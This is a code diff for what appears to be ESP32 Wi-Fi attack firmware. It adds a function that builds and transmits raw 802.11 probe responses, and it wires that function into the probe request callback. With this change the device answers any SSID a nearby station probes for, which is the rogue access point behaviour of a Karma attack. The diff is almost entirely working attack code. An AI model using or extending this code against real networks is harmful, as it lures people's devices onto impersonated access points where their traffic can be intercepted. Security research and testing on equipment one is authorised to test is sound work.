@@ -4529,7 +4529,49 @@ static void karma_add_ssid(const char *ssid) {
         TERMINAL_VIEW_ADD_TEXT("Karma cached SSID: %s\n", ssid);
     }
 }
-// Update your probe request callback:
+
+// Helper function to send a probe response to a station
+static void karma_send_probe_response(const uint8_t *sta_mac, const char *ssid) {
+    uint8_t resp[128] = {0};
+    int idx = 0;
+    // Frame Control: Probe Response (0x50 0x00)
+    resp[idx++] = 0x50; resp[idx++] = 0x00;
+    // Duration
+    resp[idx++] = 0x00; resp[idx++] = 0x00;
+    // Destination: station MAC
+    memcpy(&resp[idx], sta_mac, 6); idx += 6;
+    // Source: our AP MAC
+    uint8_t ap_mac[6];
+    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
+    memcpy(&resp[idx], ap_mac, 6); idx += 6;
+    // BSSID: our AP MAC
+    memcpy(&resp[idx], ap_mac, 6); idx += 6;
+    // Seq-ctl
+    resp[idx++] = 0x00; resp[idx++] = 0x00;
+    // Timestamp (8 bytes)
+    memset(&resp[idx], 0, 8); idx += 8;
+    // Beacon interval
+    resp[idx++] = 0x64; resp[idx++] = 0x00;
+    // Capability info
+    resp[idx++] = 0x11; resp[idx++] = 0x04;
+    // SSID IE
+    resp[idx++] = 0x00; // Tag
+    resp[idx++] = strlen(ssid); // Length
+    memcpy(&resp[idx], ssid, strlen(ssid)); idx += strlen(ssid);
+    // Supported rates IE
+    resp[idx++] = 0x01; resp[idx++] = 0x08;
+    resp[idx++] = 0x82; resp[idx++] = 0x84; resp[idx++] = 0x8B; resp[idx++] = 0x96;
+    resp[idx++] = 0x24; resp[idx++] = 0x30; resp[idx++] = 0x48; resp[idx++] = 0x6C;
+    // DS Parameter Set IE (channel)
+    resp[idx++] = 0x03; resp[idx++] = 0x01;
+    uint8_t channel = 1;
+    wifi_second_chan_t second;
+    esp_wifi_get_channel(&channel, &second);
+    resp[idx++] = channel;
+
+    esp_wifi_80211_tx(WIFI_IF_AP, resp, idx, false);
+}
+
 static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (type != WIFI_PKT_MGMT) return;
     const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
@@ -4546,6 +4588,8 @@ static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t 
                 char probed_ssid[33] = {0};
                 memcpy(probed_ssid, &payload[ssid_offset + 2], ssid_len);
                 karma_add_ssid(probed_ssid);
+                // Respond directly to probe request
+                karma_send_probe_response(hdr->addr2, probed_ssid);
             }
             break;
         }
@@ -4553,7 +4597,6 @@ static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t 
     }
 }
 
-// Update your karma_task to rotate SSIDs:
 static void karma_task(void *param) {
     printf("Karma attack started\n");
     TERMINAL_VIEW_ADD_TEXT("Karma attack started\n");
